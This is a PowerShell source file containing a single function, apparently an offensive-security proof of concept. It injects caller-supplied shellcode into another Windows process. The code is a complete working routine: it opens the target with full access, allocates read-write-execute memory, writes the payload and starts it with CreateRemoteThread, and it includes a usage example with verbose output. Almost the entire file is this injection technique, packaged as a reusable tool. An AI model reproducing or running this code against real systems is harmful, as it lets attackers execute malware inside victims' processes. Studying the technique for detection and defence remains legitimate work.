function Invoke-ShellcodeViaRemoteThread
{
<#
.SYNOPSIS
    Injects and executes shellcode in a remote process using CreateRemoteThread.
    
    This is a straightforward proof-of-concept demonstrating how to inject shellcode into a
    remote process by allocating memory with RWX permissions, writing shellcode, and
    spawning a thread inside the target process with CreateRemoteThread.

    This technique is common and widely documented, but also highly detectable by modern
    EDR products due to the use of VirtualAllocEx and CreateRemoteThread APIs.

    Notes:
        - I tested this POC on x64 Win11.
        - You can only create an x64 processes on an x64 host architecture.

.DESCRIPTION
    Author: Silentis Vox (@SilentisVox)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.PARAMETER TargetPID
    Process ID of the remote target to inject into.

.PARAMETER Shellcode
    A byte array containing the shellcode to be injected.

.EXAMPLE
    PS C:\> Invoke-ShellcodeViaRemoteThread -TargetPID 1234 -Shellcode $Shellcode -Verbose
    VERBOSE: [+] Opened Handle To Process.
    VERBOSE: [+] Allocated Memory To 0x1883390148608.
    VERBOSE: [+] Shellcode [272] Written To 0x1883390148608.
    VERBOSE: [+] Created Thread [13724] And Is Executing.
    True
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [UInt32]$TargetPID,

        [Parameter(Mandatory)]
        [Byte[]]$Shellcode
    )

    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Kernel32
    {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    }
"@
    
    # Intialize needed variables.

    $ShellcodeSize                      = $Shellcode.Length
    $BytesWritten                       = [IntPtr]::Zero

    $PROCESS_ALL_ACCESS                 = 0x001F0FFF
    $InheritHandle                      = $false

    # Open a handle to the target process.

    $ProcessHandle                      = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $InheritHandle, $TargetPID)

    $INVALID_HANDLE_VALUE               = [IntPtr]::New(-1)

    if (($ProcessHandle) -and ($ProcessHandle -ne $INVALID_HANDLE_VALUE))
    {
        Write-Verbose "[+] Opened Handle To Process."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] OpenProcess Failed: $FunctionError"
        $false
        return
    }

    # Allocate memory inside the target process space.

    $AddressPointer                     = [IntPtr]::Zero
    $MEM_COMMIT                         = 0x00001000
    $PAGE_EXECUTE_READWRITE             = 0x40

    $RemoteAddress                      = [Kernel32]::VirtualAllocEx($ProcessHandle, $AddressPointer, $ShellcodeSize, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

    if ($RemoteAddress)
    {
        Write-Verbose ("[+] Allocated Memory To 0x{0:X}." -f $RemoteAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] VirtualAllocEx Failed: $FunctionError"
        $false
        return
    }
    
    # Write shellcode to the allocated memory.

    $Result                             = [Kernel32]::WriteProcessMemory($ProcessHandle, $RemoteAddress, $Shellcode, $ShellcodeSize, [Ref] $BytesWritten)

    if (($Result) -and ($BytesWritten.ToInt32() -eq $ShellcodeSize))
    {
        Write-Verbose ("[+] Shellcode [$ShellcodeSize] Written To 0x{0:X}." -f $RemoteAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] WriteProcessMemory Failed: $FunctionError"
        $false
        return
    }

    # Create a thread pointing to our memory.

    $ThreadAttribute                    = [IntPtr]::Zero
    $StackSize                          = 0
    $Parameter                          = [IntPtr]::Zero
    $CreationFlags                      = 0
    $ThreadId                           = [IntPtr]::Zero

    $Result                             = [Kernel32]::CreateRemoteThread($ProcessHandle, $ThreadAttribute, $StackSize, $RemoteAddress, $Parameter, $CreationFlags, [Ref] $ThreadId)

    if ($Result)
    {
        Write-Verbose "[+] Created Thread [$ThreadId] And Is Executing."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!]  Failed: $FunctionError"
        $false
        return
    }

    $true
}
